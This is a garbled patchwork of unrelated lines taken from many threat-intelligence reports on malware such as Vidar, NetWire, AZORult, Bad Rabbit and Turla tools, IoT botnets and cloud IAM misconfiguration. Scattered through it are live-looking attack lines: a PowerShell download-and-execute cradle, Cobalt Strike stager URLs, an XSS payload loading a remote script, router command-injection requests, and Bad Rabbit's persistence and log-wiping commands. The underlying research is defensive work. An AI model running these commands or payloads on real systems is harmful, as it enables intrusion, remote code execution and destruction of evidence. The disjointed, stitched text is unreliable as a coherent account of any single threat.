0	Unit 42 Cloud Threat Report: Misconfigured IAM Roles Lead to Thousands of Compromised Cloud Workloads
0	Risky Combination of Policies
0	Figure 7.
0	Harden IAM Roles Trust Policy: Never grant anonymous access ("Principal" : { "AWS" : "*" }) to any IAM role.
0	Legal NoticesPrivacy
0	Unit 42 Cloud Threat Report: CSP Findings on Logging, Encryption and Exposed Services
0	 2022 Palo Alto Networks, Inc. All rights reserved.
0	The role names that the principal can pass.
0	All CSP users
0	Figure 13 illustrates the research methodology:
0	Tags: AWS, Cloud Threat Report, IAM, public cloud
0	About Us
0	Details of the Red Team exercises and GitHub reconnaissance research can be found in the Unit 42 Cloud Threat Report, 2H 2020 (CTR).
0	The second generation (2.x) was used to conduct an attack which we investigated during its active stage.
0	Therefore, we can presume that the attack is not the exclusive work of Chinese-speaking cybercriminals.
0	Kaspersky Lab began this ongoing research in the autumn of 2011.
0	MGAMECorp
0	FantasyTechnologyCorp
0	C&C domain naming and resolution
0	Tagged as:Battleground, Counter Strike, FaceIt, InfoStealer, vidar
0	The ASEC analysis team has recently found out that the Vidar info-stealer malware is abusing a game matching program named Faceit to create C&C server URL.
0	It supports various online games such as PLAYERUNKNOWNS BATTLEGROUNDS, DOTA 2, and Counter Strike: Global Offensive.
0	[IOC]File5a9c15ad92f14ce0b36726ccd4eb4ef7
0	C&C hxxps://api.faceit[.]com/core/v1/nicknames/sslamlssa hxxp://188.34.193[.]205
0	Also, update V3 to the latest version so that malware infection can be prevented.
0	[File Detection] Trojan/Win.Generic.C4452995 (2021.05.06.01)
0	See the data sent below, which shows that Vidars version is v38.6.
0	Vidars network behavior
0	In the past, the malware simply connected to C&C server and received commands and additional files like other malware.
0	Faceit is a platform which supports game matching for online game users.
0	List of games supported by Faceit
0	Malicious users profile
0	Categories:Malware Information
0	A FortiGuard Labs Threat Analysis Report
0	Go, also known asGolang, is astatically typed,compiledprogramming languagedesigned atGoogle that is becoming more popular within the malware development community.
0	0x01 Overview of Go Binary
0	Redresssoftware is a tool for analyzing stripped Go binaries compiled with the Go compiler.
0	From the name of some functions, we can guess this malware should be ransomware.
0	However, the number of lines in the source code is just over 300.
0	0x02 Dynamic Analysis of Go Binary
0	The hard-coded RSA public key in the Go binary
0	The following is the data after RSA encryption.
0	The README file for decryption is shown in Figure 13.
0	Encoded encrypted AES key with Base64
0	In this blog, I will analyze a newly found Golang ransomware targeting Linux systems.
0	SHA256: 50470f94e7d65b50bf00d7416a9634d9e4141c5109a78f5769e4204906ab5f0b
0	This malicious elf file has been detected as ELF/Cryptor.B!tr by the FortiGuard AntiVirus service.
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	IoC: fullofdeep<at>protonmail.com
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	According to our analysis, we can see that this ransomware isnt complicated and might be in an initial development stage.
0	We should be aware that more and more malware is being developed with Golang, and I will constantly monitor and filter malware written in this new programming language.
0	Huawei Home Routers in Botnet Recruitment
0	A Zero-Day vulnerability (CVE-2017-17215) in the Huawei home router HG532 has been discovered by Check Point Researchers, and hundreds of thousands of attempts to exploit it have already been found in the wild.
0	On 23rd November, Check Point Researchers noticed some of Check Points sensors and honey-pots were generating suspicious security alerts.
0	In this case though, the TR-064 implementation in the Huawei devices was exposed to WAN through port 37215 (UPnP).
0	Figure 4: VirusTotal Detection Rate for the downloaded payload
0	As with the Mirai botnet, the DNS name and other strings are decoded using a simple XOR operation with the value 0x07.
0	7a38ee6ee15bd89d50161b3061b763ea mips
0	Linux.OKIRU.A
0	IPS & Anti-Bot Prevention
0	References
0	2022 Palo Alto Networks, Inc. All rights reserved.
0	Black-T: New Cryptojacking Variant from TeamTNT
0	Of these new TTPs, most notable are the targeting and stopping of previously unknown cryptojacking worms (i.e.the Crux worm, ntpd miner, and a redis-backup miner).
0	The Black-T tool also has the capability to use three different network scanning tools to identify additional exposed Docker daemon APIs, within the local network of the compromised system and across any number of publicly accessible networks, to extend their cryptojacking operations.
0	Both masscan and pnscan have been used before by TeamTNT actors.
0	Unit 42 researchers downloaded each of the software samples and believe these samples to be the same style of samples that have been previously reported (see Table 1).
0	As a rule, cybercriminals invite potential victims to install a new version of a browser or Adobe Flash Player.
0	This is our latest summary of advanced persistent threat (APT) activities, focusing on events that we observed during Q3 2022.
0	Analysis of the file showed it to be Trojan-Downloader.Win32.Buerak, packed using Nullsoft Scriptable Install System.
0	P: +86.05372178000 F: +86.05372178000
0	Registrant Contact:
0	char key[]=0l23kj@nboxu;
0	This stage 2 malware dropper is heuristically detected by Kaspersky products as HEUR:Trojan.Win32.Generic.
0	The company where the malware was distributed is assumed to be an affiliate of a certain company.
0	[File Detection] Trojan/PowerShell.InvokeShell (2021.04.27.00) Infostealer/Win.Sysinfo.C4439416 (2021.04.26.03) CoinMiner/Win.XMRig.C4439427 (2021.04.27.00) Trojan/Win32.CobaltStrike.R329694 (2020.11.26.06) Malware/Win32.Generic.C1883131 (2017.03.27.01) Trojan/Win32.RL_Generic.R292199 (2019.09.20.01) Trojan/Win32.Wacatac.R355370 (2020.11.11.02) CoinMiner/Win.Agent.C4439419 (2021.04.26.03) Trojan/Win64.XMR-Miner.R226842 (2019.12.11.01) Unwanted/Win.NSSM.C4439418 (2021.04.26.03) Trojan/PS.Cobalt (2021.04.06.00) Trojan/Win.CobaltStrike.C4399063 (2021.04.01.01)
0	powershell.exe $dadf=IEX(New-Object Net.WebClient).D;$ien=ownloadString(hxxp://hcut.co[.]kr/api/runtime.ps1);$nv3=IEX(New-Object Net.WebClient).Do;$qc=wnloadString (omitted)
0	2008.exe: Cobalt Strike Stager (beacon download URL: hxxp://103.39.108[.]20:2008/cDIl) 2008a.exe: Cobalt Strike Stager (beacon download URL: hxxp://103.39.108[.]20:2008/eZ5h) bits_se.exe: Cobalt Strike Stager (beacon download URL: hxxp://103.39.108[.]20:2008/cDIl) k64.src: Cobalt Strike Stager (beacon download URL: hxxp://www.pc1024[.]net:3322/NDaj) shellcode.dll: Cobalt Strike Stager (beacon download URL: hxxp://103.39.108[.]20:2008/yGYC) 51032u.exe: CoinMiner Installer avmi.exe: XMRig CoinMiner xmrig.exe: XMRig CoinMiner svchost.exe: NSSM Service Manager
0	Next, there was an attack confirmed on March 16.
0	The page hxxp://[c2_hostname]/groups/business-principles.html is used as an starting point for the attack.
0	We have discovered and analysed two previously unknown infector vectors that were used in the MiniDuke attacks.
0	The Metasploit code was released on December 29, 2012 and the vulnerability was officialy fixed on January 14, 2013 (MS13-008) while the page with the exploit was uploaded on February 11, 2013.
0	Last-Modified: Mon, 11 Feb 2013 09:50:47 GMT
0	HEAD /groups/about.htm HTTP/1.1
0	Tweet with an encoded MiniDuke command
0	(decoded command URL: hxxp://www.artas.org/web/)
0	https://login.aliexpress.com/havana_login_check.htm?site=4&loginurl=https://us.cobra.aliexpress.com/p4pforlist.html?pid=801_0000_0107%26cb=3D%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&params
0	=https://us.cobra.aliexpress.com/p4pforlist.html?pid=801_0000_0107%26cb=%253Cscript%2Btype%253D%2527text%252Fjavascript%2527%2Bsrc%253D
0	%2522https%253A%252F%252Fgmailtracker.com%252Fpoc.js%2522%253E%253C%252Fscript%253E
0	[Behavior Detection]Malware/MDP.SystemManipulation.M2040
0	It is assumed that the various keywords such as game cracks and keygens for programs were inserted to make the website appear on the search result page of a search engine.
0	Tagged as:Adware, BeamWinHTTP, Ficker, PUP, RACOON, vidar
0	ZU554M += "metahtmlhead.com" + "/" + "folder" + "/" + "ip" + "/" + "zxc" + "."
0	for (E9VLQF = 0; E9VLQF < P23WTA["length"]; E9VLQF++) { if (".input.select."["indexOf"]("."
0	+ P23WTA[E9VLQF]["tagName"]["toLowerCase"]() + ".")
0	We can also reveal that part of the C&C infrastructure was previously registered under the email [emailprotected].
0	\x58\x4D\x4E\x4E  (The word zollard Xored with 0x22)
0	o A smaller and different set used for 2nd stage payloads.
0	GET /shell?echo+jaws+123456;cat+/proc/cpuinfo HTTP/1.1
0	Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)
0	e=start_ping&action=&commit=0&nowait=1&ping_ip=%%3b%%20AAA
0	<?xml version=1.0 encoding=UTF-8?><postxml><module>
0	ha859.com (222.112.82.231)
0	Controller Servers
0	REPORT %s:%s
0	Content-Type: application/x-www-form-urlencoded
0	D-Link 850L Router Cookie Overflow Remote Code Execution
0	522EF21132B734853307DDDAC6B5DFB9
0	Anti-Bot blade blocks IOTroops malware communication.
0	It is also evident the developers have an understanding of Luas interpreter internals, due to their usage of the interpreters internal functions.
0	Check Point IPS and Anti-Bot Blades provides full protection against this threat.
0	Wireless IP Camera (P2P) WIFICAM Cameras Information Disclosure
0	The malware uses Lua interpreters internal functions to initialize the Lua engine, load the LuaSocket libraries and define some custom Lua global variables, some of which the attackers later reference in their Lua code.
0	Reporting servers are prefixed with the f subdomain name.
0	core of botnet, recruits new bots through vulnerability enumeration
0	AVTECH Devices Multiple Vulnerabilities
0	Functionality Analysis
0	This powerful setup gives the attackers flexible and dynamic control of infected devices, allowing them to easily target anything with custom, updateable attack code, and alter the malwares behavior without updating the binary itself.
0	The ASEC analysis team has recently shared information about the distribution of Makop ransomware disguised as job applications.
0	AhnLabs anti-malware software, V3, detects and blocks the malware using the aliases below.
0	Unlike the last time, the compressed file is attached with the .dat extension instead of .zip and to avoid the e-mail attachment scan, the date the mail was distributed was used as a password.
0	Turlas TTPs are largely unchanged, but the group recently added a Python backdoor.ESET researchers found a watering hole (aka strategic web compromise) operation targeting several high-profile Armenian websites.
0	It relies on a fake Adobe Flash update lure and delivers two previously undocumented pieces of malware we have dubbed NetFlash and PyFlash.
0	We have previously reported multiple campaigns of this group including Mosquito and LightNeuron.This recent operation bears similarities to several of Turlas watering hole campaigns that we have tracked in the past years.
0	It uses multiple storage places such as the local database, local shared objects (Flash cookies), Silverlight storage, etc., to store the cookie value.
0	Data from ESET telemetry suggests that, for this campaign, only a very limited number of visitors were considered interesting by Turlas operators.
0	This iframe displays a fake Adobe Flash update warning to the user, shown in Figure 3, in order to trick them into downloading a malicious Flash installer.Figure 3.
0	Thus, the user is likely to believe that the update warning was legitimate.
0	Prior to the end of August 2019, the victim would receive a RAR-SFX archive containing a legitimate Adobe Flash v14 installer and a second RAR-SFX archive.
0	The commands implemented in this version of PyFlash are:Im dying :(
0	Tell my wife that i love herThen, the output of the command is sent back to the operators, encrypted with AES, via a POST request.
0	Turla is still using watering hole attacks as one of its initial access tactics.
0	Upon downloading the PDF file attached to the e-mail, the user can see the content of the PDF file which states that Bitcoin can be received for free if the user accesses the short URL written in the file.
0	There are a total of 3 URL links in the PDF file, and clicking either one of them redirects the user to the same address.
0	It is also recommended to update the running anti-malware software to the latest version regularly, and maintain their security level as high as possible.
0	Earlier this week a new ransomware attack dubbed Bad Rabbit broke out and has so far affected The Ukraine, Russia, Turkey and Bulgaria.
0	Although the attack site is currently down, below is a partial list of the trackers that we can still see as active.
0	schtasks /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR C:\WINDOWS\system32\cmd.exe /C Start \\ \C:\Windows\dispci.exe\ -id %d && exit
0	wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:
0	71 68 4B 1A 53 A9 5B 11 E2 53 A6 E4 A0 76 4B C6
0	DC 0B EC A5 FE EE 47 CD 7B 40 9E 7C 1C 84 59 F4
0	Legitimate signed file dcrypt.sys
0	Please see below for a full flow of how Bad Rabbit operates.
0	Various healthcare, media, software and distribution companies and critical infrastructure, such as the Ukranian train services, Odessa airport and The Ukranian Ministries of Finance and Infrastructure all suffered down time.
0	Lock memory previously allocated by VirtualAlloc
0	The module retrieves the boot device by querying for:
0	\\ArcName\\multi(0)disk(0)rdisk(0)partition(1).
0	The new (malicious) MBR and two second stages loaders are present in the main module's resources section and have the following IDs:
0	301b905eb98d8d6bb559c04bbda26628a942b2c4107c07a02e8f753bdcfe347c
0	Further, if someone decides to analyze the malware via crashing the system and further obtaining the generated crash dump, this attempt will fail because crash dumps will be also encrypted due to the set filter.
0	The documents were written in the Mongolian language, with one of them allegedly from the Mongolian Ministry of Foreign Affairs:Document 1: Information about the prevalence of new Coronavirus infectionsDocument 2: Purchases for buildings in documentary projectsThese RTF files were weaponized using version 7.x of a tool named RoyalRoad (aka 8.t).
0	This not only serves as a persistence technique, but also prevents the infection chain from fully detonating if run inside a sandbox, as a relaunch of Microsoft Word is required for the full execution of the malware.
0	The RAT module appears to be a custom and unique malware, though it also includes some rather common core capabilities, listed below:
0	Searching for similar files by the internal names (http_dll, Rundll32Templete and minisdllpub), unique exported functions (Engdic, WSSet and MSCheck) and code similarities (decryption methods, communication patterns, etc.), allowed us to find more samples related to the attacker:Newly discovered related samplesOne of the samples found (92de0a807cfb1a332aa0d886a6981e7dee16d621) led us to an article covering a similar initial infection chain, which appears to be after Ukrainian targets.
0	Another sample (9ef97f90dcdfe123ccb7d9b45e6fa9eceb2446f0) was originally dropped by an RTF document which appears to be targeting entities in the Russian Federation, back in late 2018.
0	From the malicious document perspective, we believe that the naming scheme for intel.wll  which is dropped by version 7.x of RoyalRoad is not enough to make a clear cut attribution, as we observed the same name used by various threat actors dropping different malware families such as Bisonal and Poison Ivy.
0	In the NWCWorkstation.dll sample mentioned above, we observed a unique string as part of the logging functionality: V09SS0lO.
0	The servers from the 2017 publication were set on the same infrastructure as all the other samples found during our investigation, and utilize Vultr and GoDaddy services.
0	By investigating this dropped file, we were able to make several correlations to the BYEBY sample from 2017:BYEBY stringswincore.dll stringsMalware implementation similaritiesTo recap, the second stage payload in the attack chain, is an encrypted DLL file named minisdllpub.dll.
0	As can be seen in the following image, each list is comprised of the name of a library followed by a sequence of API functions to load from this library.
0	The structures which were previously built and filled, are now used by the RAT to dynamically invoke API functions and deliver data to the C&C server.
0	Appendix A: RAT Module  Supported CommandsAppendix B: Files on the serverAppendix C: Additional IOCsServers:RTFs:DLLs:RAT: 1994 Check Point Software Technologies LTD. All rights reserved.
0	The full intention of this Chinese APT group is still a mystery, but it is clear they are here to stay and will update their tools and do whatever it takes to attract new victims to their network.
0	By doing so, the second-stage is operating as a middle-man between the C&C and the final payload  a remote access tool.
0	Research By: Mark Lechtik and Raman Ladutska
0	The Brazilian cyberspace is known to be a whole ecosystem of its own and, although the banking malware that originates there has traditionally been somewhat basic, recent trends have indicated new and more refined tools for attack.
0	Our research below illustrates how a victim, once logged onto their online bank account, whether it be HSBC, Santander, Citibank or one of several Brazilian banks, is deceived into allowing the attacker free reign of their account.
0	By understanding more about how this particular attack operates and how it is perceived on the front end from the customers point of view, we hope to raise awareness and thwart similar attacks in the future.
0	Injects prs.png into explorer.exe and notepad.exe
0	Shutting down system utilities (such as taskmgr, dwm, regedit etc.)
0	These forms are essentially Delphi objects that contain various attributes such as Edit, Memo and other GUI components which are utilized for the purpose of storing important information.
0	As an example, we can see the TAUXILIO_TURCO form, which contains various pieces of information and functionality as depicted below:
0	Multi-threading functionality is performed with the help of Timer objects, which are widely present across the forms.
0	Under certain circumstances this module will kill several
0	The files are all PE exe files between 232 KB and 264 KB, compiled with Microsoft Visual Studio 2005.
0	At its OEP, the module further retrieves environment information, and then creates a mutex with the string SUPER MUTEX.
0	Registry key: HKCUSoftwareMail.RuAgentmagent_logins,
0	binary value: ####password
0	Text file used by Mail.Ru Agent to store Blowfish encryption key
0	%APPDATA%MraUpdatever.txt
0	2012:11:22:17:21:44PROBING GET FILE LOW LIVEL
0	Meanwhile PROGA word used in here might refer to transliteration of Russian slang which literally means an application or a program.
0	The string between [ and ] is binary value of MD5 Hash of the Mail.ru Agent password.
0	Oddly, the WriteFile size parameter is set to 0 and the write fails.
0	%SYSTEM%\config\SECURITY -> %Temp%\kse
0	Like PswSuperMailru, this highly-obfuscated module is very different from others.
0	Its main purpose is to steal email credential information of the current user.
0	Software\Mail.Ru\Agent\magent_logins
0	The encryption algorithm reminds PKZIP encryption but seems to be modified.
0	Decrypted data is carefully collected and filled in a set of internal objects.
0	The contents of the file contains internal file reference string, including date and time when it was created, i.e.@MSHASH\SAMHASH_2_20121002_034519.txt.
0	%CurrentDir%\sys_%HexNumber%\winocx_%IntegerCounter%_rdtp.tmp
0	This is done in case Microsoft Windows MAPI framework creates a popup message with some connection error report, or asks the user to enter credentials from the mailbox.
0	User domain name (from %USERDOMAIN% and %USERDNSDOMAIN%)
0	The filter for interesting emails is defined in a list of regular expressions (PCRE lib is used to process those):
0	.doc .xls .txt .vcf .p7m .mdb .msgz .dcx .egk .zm9 .docx .xlsx .eml .CCC .cif .fas .msg .kum .key .out .rtf .pdf .enc .TOK .wps .sbox .lock .ass .cer .pem .odt .rar .html .xia .sec .cm5 .xps .pgp .wfh .cbu .ods .zip .htm .xis .dat .rhs .x05 .xiti .grp .sig .dot .gpg mht .p7s .dth .max .y05 .egm .pot .ftil
0	Current module is also capable of dumping full contents of local systemAddress Book, however this functionality is currently disabled by the developer (probably because of some bugs in the code).
0	The file is a PE EXE file, compiled with Microsoft Visual Studio 2005.
0	This module is responsible for receiving and storing email messages on a local computer from a POP3 server specified in a configuration file.
0	ProductID = SHA1(MAC, AdapterIP, VolumeSerialNumber, IE Product ID)
0	huiofwhfiowjcpowjkcwcophwvurweionwopmcvopwkvpwjnhopv, if it exists, then module terminates.
0	Establishes a connection based on pop3server (or imapserver), login and password parameter values in config file.
0	There is a variable which for some reason is not initialized, that is used to control the network communication, i.e.
0	This module is a standalone Windows executable which is automatically started on system boot and runs secretly in the background.
0	This is a standalone EXE application module which is used to drop and run USBStealer module (IGFXTRAYMS.exe) along with its configuration file (imapisync32.dat)
0	hose two files are zlib compressed and stored in the overlay of the dropper.
0	HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ctfmon32rt = 
0	The log file also includes detailed information about the system it was launched on.
0	TimeZone: Russian Standard Time
0	Criterias for files are defined in external encrypted binary config file which must be deployed during setup.
0	2010.10.14 07:07:58 (GMT)
0	This information is put in the log file in the first place along with current date and time.
0	This window receives notifications from specific device types.
0	F18A0E88-C30C-11D0-881500A0C906BED8(GUID_DEVINTERFACE_USB_HUB)
0	A5DCBF10-6530-11D2-901F00C04FB951ED(GUID_DEVINTERFACE_USB_DEVICE)
0	The module utilizes PCRE (Perl Compatible Regular Expressions) library to effectively apply regular expression allow and denylists against filenames.
0	The criterias are splitted into groups and parameters are names with specific prefix of the group (a, d, s, sd, fa).
0	_fdeltatime= /2592000/ #files must be not older than 2592000 seconds or 30 days
0	a=/\.sxw$/ #StarOffice/OpenOffice document file
0	a=/ScribeOptions\.xml/ #probably settings of Scribe crossplatform e-mail client
0	_s_fctime= /1990-01-01 01:02:03/ #files of group s after 1990-01-01 are interesting
0	sa=/\.xps/# This is a subgroup of various files with secrets, such as digital certificates, configs and password databases
0	sa=/\.conf$/
0	*\.exe$/ sa=/\\Acid Technologies\\/# Probably this and above refers to Acid Cryptofiler military grade encryption software
0	The module lists all available attached removable drives, iterates through all of them except A: and B: (reserved for floppy disks).
0	This module works offline and doesnt communicate with any other host on the network.
0	*EXPLORER\.EXE/
0	_f_fctime= /1999-02-03 02:03:07/
0	This module works offline and doesnt communicate with any other host on the network.
0	Compilation date (encrypted)
0	Its main purpose is to log keystrokes, copy input texts and make screenshots.
0	The file is a PE EXE file, compiled with Microsoft Visual Studio 2005.
0	# The following subgroup defines useless files that will not be taken.
0	attrib -a -s -h -r
0	There are 2 known variants of this module in over 50 files with identical behavior.
0	specialforoutlookattachments!
0	This demand creates a vulnerability that malicious actors have quickly taken advantage of by spreading malware disguised as a Coronavirus map.
0	AZORult is an information stealer and was first discovered in 2016.
0	It is used to steal browsing history, cookies, ID/passwords, cryptocurrency and more.
0	It can also download additional malware onto infected machines.
0	AZORult is commonly sold on Russian underground forums for the purpose of collecting sensitive data from an infected computer.
0	There is also a variant of the AZORult that creates a new, hidden administrator account on the infected machine in order to allow Remote Desktop Protocol (RDP) connections.
0	As the coronavirus continues to spread and more apps and technologies are developed to monitor it, we will likely be seeing an increase in corona malware and corona malware variants well into the foreseeable future.
0	The malware also uses an information-stealing technique, which was first seen in 2016 and related to the AZORult malware family.
0	When analyzing this file, it was easy to see that it was an archive, which means that it probably contains execution commands that can execute it.
0	Simply by using Winrar to view the archive content, I found two files inside it and they were in self-extracted mode (SFX).
0	The two files were Corona.bat and Corona.sfx.exe, which we can also see in the process tree in procmon.
0	I came across it once before, and after doing some digging around, discovered that this information-stealing tactic came from a malware family called AZORult, which was first seen in the wild in 2016.
0	This is also a pretty common technique that is used to trick AVs.
0	After unpacking, I noticed that there was another layer of packing.
0	This time, it was with AutoIT.
0	Moving forward with the analysis, I found that this binary is responsible for enumerating the OS in order to find new browsers and resources that it can steal information from:
0	Prevention and RemediationRemediationDownload the Reason Antivirus software.
0	Doubleclick on the installed executable and follow the prompts to complete the installation.
0	Definitions and security patches will automatically be updated.Once the process is complete, select the Scan Now button to start your scan.
0	When the scan is finished, select all the threats that were detected and then click on Remove selected threats.
0	MetaDatahashes***Note***The original Johns Hopkins University or ArcGIS coronavirus map hosted online is not infected or backdoored in any way and are safe to visit.
0	About Reason LabsReason Labs is the threat research arm of Reason Cybersecurity.
0	We play a leading role in researching and exploring cyber threats and advancing the state of cybersecurity intelligence.
0	Reason Labs collects raw data about existing and emerging threats and analyzes that data to deliver actionable insights in real-time.
0	We leverage the threat intelligence we gather from always-on active sensors, in order to continuously analyze, organize, and add context to evolving cyber activities, attacks and threats.
0	This powerful intelligence network leaves Reason prepared to meet threats head-on.
0	For more information reach out at shai@reasonsecurity.comOffline version of the analysis can be found here
0	Once the installation is complete, click Finish.
0	NetWire is a Remote Access Trojan (RAT) malware that has been widely used for many years.
0	Recently, FortiGuard Labs noticed a type of malware spreading via phishing email, and during the analysis of it, we discovered that it was a new variant of NetWire RAT.
0	A New NetWire RAT Variant is Being Spread via Phishing Email
0	Figure 1, below, is a screenshot of the phishing email content.
0	It contains a PDF-like picture at the bottom with a hyperlink pointing to the download link of NetWire.
0	It uses many anti-analysis techniques to protect it from being analyzed.
0	It dynamically extracts malicious code onto its memory and executes it.
0	It does this by comparing the mouse cursor position twice.
0	A non-matching result means the mouse has been moved.
0	cmp dword ptr [eax+8], 0 ; Dr1
0	pop eax ; Key API address, like kernel32.CreateProcessInternalW
0	call eax ; call the API like kernel32.CreateProcessInternalW
0	cmp dword ptr [edx+4], 41414141
0	The true code of NetWire was extracted to overwrite the existing code in the child process and it is executed there.
0	Then Windows will pop up a crash message, like the one shown in Figure 4.
0	Figure 5 is the screenshot of the process tree.
0	Figure 6 shows the screenshot of the Registry Editor.
0	Encoded Keylogger log file and its decoded content
0	The left side of Figure 7 is the encoded keylogger record and the right side is the plaintext content that was decoded by my python script.
0	Since its C&C server was down at the time I started to analyze this new variant, I used a fake C&C server on one of my test systems to send the crafted response packet used in my analysis.
0	Figure 8 shows a packet that is about to be sent to the C&C server.
0	The first four bytes are 56 in hexadecimal, which is the size of the following data.
0	07 is a special separator to separate different data fields.
0	It is 2019-09-14 16:59:34 in this analysis.
0	As I mentioned above, the function Task_Fun() handles the commands, with one subprocedure called for one command.
0	Command numbers: 09Ch, 09Ch, 0A3h, 0AFh, 0B6h, 0C3h
0	Lets take a look at them and see what they can do to the victims system.
0	Other than the 9B command, it has more than 80 subprocedures.
0	That means it can handle more than 80 commands sent from the C&C server.
0	These are the entire feature set that this new NetWire variant supports.
0	Should be in 097h ~ 0E8h
0	Command numbers: 09Fh, 0A0h, 0A1h, 0A2h, 0AEh, 0AFh, 0B0h ~ 0B5h, 0B7h, 0DFh, 0E8h
0	Below is an example of collected endpoint data from my test system:
0	1E6D8050 73 76 63 68 6F 73 74 2E 65 78 65 07 37 30 38 07 svchost.exe708
0	1E6D8060 54 43 50 07 30 2E 30 2E 30 2E 30 3A 31 33 35 07 TCP0.0.0.0:135
0	1E6D8070 30 2E 30 2E 30 2E 30 3A 30 07 4C 69 73 74 65 6E 0.0.0.0:0Listen
0	1E6D80F0 77 6B 2E 65 78 65 07 32 37 32 30 07 54 43 50 07 wk.exe2720TCP
0	The original downloading URL in the phishing email and the domain of the C&C server are both rated as Malicious Websites by the FortiGuard Web Filtering service.
0	The 7z file and decompressed exe file are detected as W32/NetWire.A!tr by the FortiGuard Antivirus service.
0	Sample SHA256
0	[PROFORMA-INVOICE 0990.exe]
0	C9EC52AE2DDB993E2DA0EFD4FBAB0BFECDC7CC6DA16E446AC9C92E7981733E6E
0	[PROFORMA-INVOICE 0990.7z]
0	56BB4AAC4E52FD5D71824782D1DBE05D4209045C1E5DD80936690E81652183B8
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	Fortinet Protections for NetWire RAT
0	Known locations: %APPDATA%MicrosoftRtkN32Gdi.exe
0	The file is a PE EXE file, compiled with Microsoft Visual Studio 2010.
0	The module traverses the directories from a hardcoded list, looking for files with names matching regular expressions .*..
0	%SystemDrive%Documents and SettingsLocalServiceLocal SettingsApplication DataMicrosoft
0	%ALLUSERSPROFILE%Application DataMicrosoftOfficeData
0	If the file was decompressed without errors, it is expected to start with a header that describes an internal task.
0	DocBackdoor (Acrobat Reader and Microsoft Office plugin) module
0	Known file locations: add-on directories of Acrobat Reader or Microsoft Office, depends on installation settings.
0	The malware contains a universal plugin for Acrobat Reader and Microsoft Office application.
0	The plugin does not depend on the application so it could have been used with other applications, too.
0	The module iterates through file handle values from 0 to 65534 with step 4, and tries to get file size for every handle.
0	The module retrieves the name of the file, reads the whole file into memory and checks its last DWORD.
0	If the DWORD matches the magic value, it reads more values from the end of file.
0	If the operation mode byte is equal to 3, the module loads the decrypted payload as a PE DLL library using own PE format loader, and executes its DllMain function.
0	OfficeBDInstaller module (Microsoft Office plugin installer)
0	SetOption(conn_a.D_CONN, [65] nt-windows-online.com;nt-windows-update.com;nt-windows-check.com)
0	%ALLUSERSPROFILE%Application DataMicrosoftOfficeData
0	%ProgramFiles%Microsoft OfficeOffice11Data
0	FriendlyName=%msplugin_desc1 option value%
0	HKCRCLSID%plugins CLSID%VersionIndependentProgID
0	LoadBehavior=DWORD:0x10
0	List of C&C domain names, separated by ;
0	SetOption(conn_a.J_USER, [21] %removed% )
0	Main function (task_arplugin)
0	ED5FF814B10ED25946623A7EC2C0A682
0	Known samples share one code section, but contain different payloads in the resource section.
0	All the functionality is implemented in the DllMain function.
0	SetOption(conn_a.D_CONN, [65] nt-windows-online.com;nt-windows-update.com;nt-windows-check.com)
0	Once it is loaded it was designed to start scanning other hosts in the network and record responses.
0	It would do several probes for remote vulnerabilities, such as MS08-067.
0	It is capable of dumping current configuration of Cisco routers if they are available via SNMP and the scanner successfully guessed the SNMP community name.
0	It seems that it was developed and tested as an EXE file, however in the release version it was compiled as a DLL.
0	This change was extremely significant for the whole functionality which creates a number of worker threads right in the main function, which is would be fine for EXE module WinMain function, but is restrcited for library DllMain function.
0	This broke down the module as it created threads which couldnt run when DLL is loaded via LoadLibrary API.
0	However, its important to note that the developers implemented own PE loader, which doesnt have such limitation as Window native PE loader, and which is why it can still be used as a component of malicious kit.
0	CISCO configuration dumper function call graph
0	Next it checks host for SIP service.
0	OPTIONS sip:smap@localhost SIP/2.0
0	Call-ID: 1638708638@%Local IP%
0	IP%:11122;branch=z9hG4bK.51125;rport;alias
0	From: ;tag=3a539be23b6269ec
0	However, availability of LLSRPC pipe is checked only to detect the remote OS Service Pack version.
0	There are few other methods in the code that provide reliable detection of Service Pack 1,2,3 of Windows 2000.
0	156 is some SQL Server port, however we dont know any software running on port 156
0	1043 can be used by BOINC software or Microsoft IIS
0	If ports 80 or 8080 are open, then the module sends simple HTTP request to test if the remote webserver is available and if it is running MS Excahnge server.
0	MS Exchange is probed with the following HTTP request:
0	GET /ews/exchange.asmx HTTP/1.0
0	Collected information and logs are never saved to a file on disk, instead it is compressed using Zlib compress2 method and uploaded to the server.
0	SetOption(conn_a.D_CONN, [60] microsoftosupdate.com;microsoft-msdn.com;microsoftcheck.com)
0	The config defines parameters for the method task_msexploit, which includes the following:
0	msexploit_loc  a payload to be pushed if exploit worked successfully;
0	msexploit_ip  an array of IPs to attack.
0	Then the module gets local proxy settings, starting from MS Internet Explorer settings, then parsing Opera profile files (if exist) and finally getting proxy settings from quite suspicious registry keys:
0	HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrps
0	HKLMSoftwareMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrps
0	We suspect that this registry key is set by a malicious module during operation and is used to store proxy server parameters.
0	The adt.dat file is an encrypted INI-file of known credentials of users in current domain and attacked organization.
0	When decrypted this file looks like this:
0	This information is checked against local domain controller to find active users with Admin privileges.
0	However, the only setting that is changed is MapMenuConfigGrps value mentioned above.
0	It is set to local parameters of system proxy server which were acquired before.
0	This is done right after the main attack procedure which uses vulnerability from MS08-067 Security Bulletin.
0	The MS08-067 attack procedure uses code identical to the code of scanning for vulnerable hosts in Netscan module.
0	This module is used to infect other computers in local area network by another module known as Frog (full description of Frog is available in a separate chapter), which is embedded in current executable.
0	The later is a backdoor component which provides capability to run arbitrary executable on the remote target.
0	The credentials are used to access system administrative share and remotely install the backdoor as a service.
0	The adt.dat file is an encrypted INI-file of known credentials of users in current domain and attacked organization.
0	The logics of processing transmitted data for all threads are similar.
0	They can either send out data about current system or receive and run an executable module.
0	This function combines DllMain and ServiceMain functions excluding system service manager routines.
0	On July 6 and July 9, 2020, we observed files associated with an attack on two state-run organizations in the Middle East and North Africa that ultimately installed and ran a variant of the Thanos ransomware.
